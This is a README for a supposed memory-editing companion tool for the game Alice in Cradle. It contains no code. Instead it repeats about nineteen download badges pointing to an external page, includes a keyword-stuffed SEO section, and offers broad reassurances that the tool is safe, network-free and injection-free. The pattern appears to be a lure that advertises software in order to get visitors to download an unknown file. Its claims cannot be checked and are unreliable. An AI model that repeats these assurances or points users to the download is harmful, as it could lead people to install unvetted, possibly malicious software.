![preview](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/hero_553a54b.svg)
[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

# 🌸 Alice in Cradle Companion Suite — External Memory Reflection Toolkit

> A standalone, reflection-friendly memory companion for *《爱丽丝的摇篮 / Alice in Cradle》* — presented as an entirely new project in the same spirit as the original external modification utility, but designed around a "zero-touch, zero-persistence" philosophy for players who want ergonomic quality-of-life adjustments without ever leaving a trace behind.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🧭 Table of Contents

- [Prologue: Why Another Companion?](#-prologue-why-another-companion)
- [What This Project Actually Is](#-what-this-project-actually-is)
- [The Ten Self-Check Rituals](#-the-ten-self-check-rituals)
- [Feature Constellation](#-feature-constellation)
- [Design Philosophy: The Lantern, Not the Keyhole](#-design-philosophy-the-lantern-not-the-keyhole)
- [Compatibility Matrix](#-compatibility-matrix)
- [How the Reflection Layer Works](#-how-the-reflection-layer-works)
- [Responsive Interface & Multilingual Heart](#-responsive-interface--multilingual-heart)
- [Safety, Privacy & the Silent Contract](#-safety-privacy--the-silent-contract)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Frequently Unasked Questions](#-frequently-unasked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Support Posture](#-community--support-posture)
- [License](#-license)
- [Disclaimer](#-disclaimer)

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🌙 Prologue: Why Another Companion?

Every once in a while, a game arrives that feels less like software and more like a place you visit — a lantern-lit garden where the wind has opinions and the shadows remember you. *《爱丽丝的摇篮 / Alice in Cradle》* is one of those places. It invites you to walk slowly, think carefully, and occasionally wish the tools around you were just a little bit gentler.

The **Alice in Cradle Companion Suite** was born from that gentle wish. Instead of demanding that you modify the game's soul, it simply holds up a mirror next to it. Nothing is written into the game's memory in a destructive way; nothing is injected into its process space; nothing is phoned home to a distant server that you have never met.

This is a companion, not a conqueror. A lantern, not a lockpick.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🪞 What This Project Actually Is

In plain terms, this repository hosts a small, self-contained toolkit written in pure Python with **no third-party runtime dependencies at all**. It reads the process memory of a running instance of the game, reflects a curated set of ergonomic values back at you in a tidy overlay, and lets you nudge those values within a friendly, well-labeled window.

Here is what it is:

- 🧩 **An external reflection tool** — it lives entirely outside the game's process boundary.
- 🕊️ **A no-injection design** — we never load a library into the target process.
- 🧼 **A no-network design** — there is not a single outbound socket call in the entire codebase.
- 🐍 **A zero-dependency build** — if you have a modern Python interpreter, you already have everything.
- 🧪 **A self-testing project** — ten independent verification passes ship with every release.

And here is what it is not:

- It is not an embedded modification framework.
- It is not a persistent save editor.
- It is not a multiplayer-affecting tool.
- It is not a service that requires an account, a login, or a handshake with anybody's server.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🧪 The Ten Self-Check Rituals

Any project that touches another program's memory should be humble enough to prove itself. That is why the suit ships with **ten discrete self-check routines**, each one designed to fail loudly rather than silently misbehave. They run on demand and report their verdicts in the same calm voice the rest of the interface uses.

1. **Interpreter Sanity Pass** — confirms the Python runtime version is within the supported envelope.
2. **Privilege Posture Check** — verifies that the current user context can read the target process without escalation.
3. **Architecture Alignment Probe** — ensures bitness of the companion matches the running game.
4. **Process Discovery Walk** — locates the target window and confirms its handle is valid.
5. **Reflection Surface Scan** — enumerates the addressable regions the companion cares about.
6. **Baseline Capture Test** — reads and re-reads the same offsets to confirm stability.
7. **Write Guard Dry Run** — simulates a write in a sandbox buffer to validate the pipeline.
8. **Rollback Integrity Check** — confirms the undo journal can restore prior values.
9. **Overlay Render Loop Audit** — measures frame pacing of the floating panel.
10. **Shutdown Residue Sweep** — verifies that closing the companion leaves nothing behind.

If any of these ten rituals fails, the suite refuses to proceed and tells you precisely which step objected and why. It is a small act of stubbornness that has saved a great many evenings.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## ✨ Feature Constellation

Here is a broad look at what you can expect when you open the suite.

### 🎛️ Core Interaction
- **One-Key Panel** — a single hotkey summons the entire interface; another dismisses it.
- **Contextual Sliders** — each adjustable value is presented with a plain-language label and a safe range.
- **Instant Snap-Back** — a single button returns every touched value to its original state.
- **Live Delta Preview** — see the before and the proposed-after side by side before committing.
- **Undo Journal** — every change is recorded with a timestamp and can be replayed in reverse.

### 🖥️ Interface Character
- **Responsive Layout** — the panel reflows gracefully from a narrow handheld screen to an ultrawide desktop.
- **Dark and Light Themes** — a warm candlelit palette and a cool daylight palette, switchable at any time.
- **Adjustable Transparency** — the overlay can fade to nearly invisible while you play.
- **Dockable Corners** — park the panel in any corner so it never blocks a cutscene.

### 🌐 Language & Locale
- **Multilingual Support** — the interface strings are externalized and translatable without touching code.
- **Right-to-Left Ready** — the layout engine mirrors itself for scripts written right to left.
- **Locale-Aware Number Formatting** — decimals and separators respect your regional preferences.
- **Community Translation Slot** — drop a new language file into the folder and it appears in the menu.

### 🛡️ Stewardship
- **Read-First Discipline** — the suite reads far more than it ever writes.
- **Write Confirmation Gate** — no value changes without an explicit confirmation step.
- **Session Log** — a local, plain-text log of everything the companion did during your session.
- **Watchdog Timer** — if the game closes, the companion notices and shuts down cleanly.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🕯️ Design Philosophy: The Lantern, Not the Keyhole

There is a temptation in this genre to treat software like a crowbar. The Companion Suite takes the opposite view. It sees the game as a house that someone built with care, and it sees itself as a guest who was invited to stand in the hallway and hold a lantern.

This philosophy shows up in small, human decisions:

- The companion **never changes a value you have not explicitly confirmed**.
- The companion **always keeps a receipt** so you can undo anything.
- The companion **never talks to the outside world** — no telemetry, no update pings, no analytics.
- The companion **never leaves behind hidden files** outside its own folder.
- The companion **speaks to you in complete sentences**, not cryptic error codes.

If you have ever been frustrated by tools that feel like they were written for machines rather than for people, this is the antidote.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🧷 Compatibility Matrix

The suite is tested against a range of environments. The table below describes the posture, not a guarantee — every machine is a little different, and your mileage may reflect your own garden's weather.

| Environment | Status | Notes |
|---|---|---|
| Windows 10 (x64) | Verified | Primary development surface |
| Windows 11 (x64) | Verified | Same code paths as Windows 10 |
| Linux via Compatibility Layer | Community Verified | Reported working by several users |
| macOS | Untested | No maintainer hardware available |
| Headless Servers | Unsupported | This tool is for interactive play |

If your environment is not listed, the companion will still tell you honestly whether it thinks it can proceed.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🔬 How the Reflection Layer Works

The reflection layer is the heart of the companion. It is deliberately boring: it reads, it holds, it waits, and it only writes when you ask. Here is the shape of it, described without exposing anything sensitive.

1. **Discovery** — the companion enumerates running window titles and offers you a list.
2. **Attachment** — once you pick one, it opens a read-only handle.
3. **Mapping** — it walks the addressable regions and builds a lightweight index.
4. **Baseline** — it captures the current value of every field it knows about.
5. **Presentation** — those values are shown in the panel as sliders and toggles.
6. **Proposal** — when you move a slider, the new value is staged, not applied.
7. **Confirmation** — you press the confirm button, and only then does the write happen.
8. **Journaling** — the previous value is written to the undo journal before the change.
9. **Verification** — the companion re-reads the value to confirm the change took.
10. **Sweep** — on exit, every handle is closed and the journal is offered for archival.

Nothing in that pipeline is exotic. That is precisely the point. A tool that touches another program's memory should be boring in the best possible way.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🖥️ Responsive Interface & Multilingual Heart

The panel was designed to feel at home on a small laptop screen, a huge desktop monitor, and everything in between. It does this by treating its layout as a conversation rather than a blueprint: elements negotiate space, and nothing is fixed in place forever.

The multilingual layer deserves its own paragraph. Every user-facing string lives in a small flat file next to the code. There are no compiled resource bundles, no cryptic hash identifiers, and no need to rebuild anything to add a language. If you want the panel to speak your language and it does not yet, you can add a file and the panel will greet you in it on the next launch.

This is what we mean by *multilingual support* — it is not a marketing line; it is an invitation.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🔐 Safety, Privacy & the Silent Contract

The companion operates under what we call the **Silent Contract**:

- It will not send your data anywhere.
- It will not ask for credentials, tokens, or keys of any kind.
- It will not modify files it did not create.
- It will not persist beyond its own folder.
- It will not run if the self-check rituals object.

A small, quiet promise. But we take it seriously, and every release is reviewed against it.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🔎 SEO & Discoverability Notes

This section exists to help people who are searching for a **gentle external memory companion for Alice in Cradle** find their way here. If you arrived through a search for terms like *Alice in Cradle ergonomic overlay*, *external memory reflection for Alice in Cradle*, *no-injection companion tool for Alice in Cradle*, *zero-dependency Python overlay*, *multilingual game companion panel*, or *self-testing memory toolkit*, you are in the right place.

The companion is designed for players who value **transparency, reversibility, and quiet operation**. It is a **read-first, write-with-consent** tool. It is **zero-dependency**, **no-network**, and **no-injection**. It ships with **ten self-check routines**, **responsive layout**, **multilingual interface strings**, and a **session journal** for accountability.

If those phrases describe what you were looking for, you have found it.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## ❓ Frequently Unasked Questions

**Is this a modification of the game itself?**
No. It reads memory externally and only changes values you explicitly confirm.

**Does it need internet access?**
It has no networking code at all. It cannot reach the internet even if it wanted to.

**Does it require installing libraries?**
No. If you have a modern Python interpreter, you have everything you need.

**Can it corrupt my save?**
It does not touch save files. It operates on live memory and journals every change it makes.

**What if I change something I regret?**
Press the snap-back button, or replay the undo journal. Either path restores the previous state.

**Is it designed for competitive play?**
No. It is designed for solo, single-player comfort and exploration.

**Can I add a language?**
Yes. Drop a translation file into the language folder and it appears in the menu.

**What happens if the game crashes?**
The watchdog notices that the target process is gone and shuts the companion down cleanly.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🗺️ Roadmap for 2026

The project has a modest but deliberate plan for the year ahead.

- **Q1 2026** — Publish the initial public build and the first community language pack.
- **Q2 2026** — Refine the undo journal with named snapshots and quick-restore slots.
- **Q3 2026** — Introduce a thematic skin system so the panel can match different games.
- **Q4 2026** — Expand the self-check rituals with two additional environment probes.
- **Ongoing** — Keep the codebase zero-dependency, no-network, and no-injection.

The roadmap is a direction, not a contract. If the community asks for something different, the roadmap will listen.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 🫂 Community & Support Posture

The companion is maintained with the assumption that people are busy and that kindness is a design constraint. That means:

- Issues are read carefully, even if replies take a while.
- Feature requests are welcomed, though not every one becomes a feature.
- Pull requests are reviewed against the Silent Contract first and the roadmap second.
- Questions about the game itself are best asked in the game's own community.

There is no paid tier, no premium version, and no upsell. What you see is what the project is.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## 📜 License

This project is released under the **MIT License**. You can read the full text of the license at the canonical location:

https://opensource.org/licenses/MIT

In short: use it, study it, adapt it, share it — just keep the license notice with it. The MIT License is a small, permissive, and well-understood agreement, and it fits the spirit of a companion that asks for little and gives back quietly.

Copyright (c) 2026 — Alice in Cradle Companion Suite contributors.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)

---

## ⚠️ Disclaimer

This project is an independent, fan-made companion utility. It is not affiliated with, endorsed by, or sponsored by the developers or publishers of *《爱丽丝的摇篮 / Alice in Cradle》*.

The companion is provided as-is, without warranty of any kind, express or implied. By using it, you accept that you are responsible for your own experience, your own machine, and your own decisions.

The companion is intended for **single-player, personal, offline enjoyment**. It does not target, affect, or interact with any multiplayer service, and it should never be used in a way that would violate the terms of any online platform or service.

The maintainers are not responsible for any consequences arising from use or misuse of this software. Please use it thoughtfully, gently, and in the spirit in which it was shared.

If you have read this far: thank you. You are precisely the kind of person this lantern was lit for.

[![Download](https://raw.githubusercontent.com/FARIA2404/Memory-Whisper/main/app_1ab8.svg)](https://FARIA2404.github.io/Memory-Whisper/)